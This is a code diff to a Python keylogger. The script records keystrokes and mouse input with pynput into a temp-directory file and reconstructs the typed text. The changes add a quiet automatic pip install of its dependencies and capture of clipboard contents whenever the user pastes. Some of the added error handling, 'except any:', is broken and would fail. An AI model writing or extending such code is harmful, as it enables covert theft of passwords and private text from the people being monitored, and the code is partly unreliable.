@@ -1,10 +1,24 @@
 import os.path
+import subprocess
+import sys
 import tempfile
 from os import mkdir
 from threading import Lock
+import pkg_resources
+
+required = {'pynput', 'pyperclip'}
+installed = {pkg.key for pkg in pkg_resources.working_set}
+missing = required - installed
+
+if missing:
+    python = sys.executable
+    subprocess.check_call(
+        [python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
 
 from pynput import keyboard
 from pynput import mouse
+import pyperclip
+import time
 
 tmp = tempfile.gettempdir()
 if not os.path.exists(os.path.join(tmp, "pkl")):
@@ -39,7 +53,7 @@ class KeyObject(KeyObjectConst):
     """
 
     def __init__(self):
-        self.x = 65 | 66 << 8
+        self.x = 0
 
     def toBytes(self):
         return self.x.to_bytes(4, "big")
@@ -68,7 +82,7 @@ class KeyObject(KeyObjectConst):
             else:
                 print("wtf is this key my guy ??")
         else:
-            self.x |= key._sort_order_ # again , fk python
+            self.x |= key._sort_order_  # again , fk python
             self.x |= 1 << self.bit_mod
             # store the index+1 in the second 8-bits cuz I can
             # also can check for it if its not equal zero then
@@ -153,7 +167,6 @@ class KeyObject(KeyObjectConst):
 
 
 class VirtualTextFieldObject:
-
     def __init__(self, submit):
         self.text = ""
         self.func = submit
@@ -180,7 +193,16 @@ class VirtualTextFieldObject:
                 if key.isCommand():
                     if key.getModKeyNumber() == 1:
                         self.selection = True
-
+                    elif key.getModKeyNumber() == 0x16:
+                        data = None
+                        try:
+                            time.sleep(0.2)
+                            data = pyperclip.paste()
+                        except any:
+                            pass
+                        if isinstance(data, str):
+                            self.text = self.text[:self.pos] + data + self.text[self.pos:]
+                            self.pos += len(data)
                 else:
                     if self.selection:
                         self.reset_text()
@@ -223,7 +245,7 @@ class VirtualTextFieldObject:
                             self.pos += 1
                         case keyboard.Key.delete._sort_order_:
                             if self.pos < len(self.text):
-                                self.text = self.text[:self.pos] + self.text[self.pos+1:]
+                                self.text = self.text[:self.pos] + self.text[self.pos + 1:]
                         case keyboard.Key.backspace._sort_order_:
                             if self.pos > 0:
                                 self.text = self.text[:self.pos - 1] + self.text[self.pos:]
@@ -255,7 +277,7 @@ def writeToFile(x):
     lock.acquire()
     try:
         file.write(b)
-    except:
+    except any:
         print("Error writing in file")
 
     lock.release()
@@ -269,7 +291,6 @@ textfield = VirtualTextFieldObject(textHandler)
 
 
 def handleKey(x):
-    global caps
     global textfield
     # print(vars(x))
     r = KeyObject()
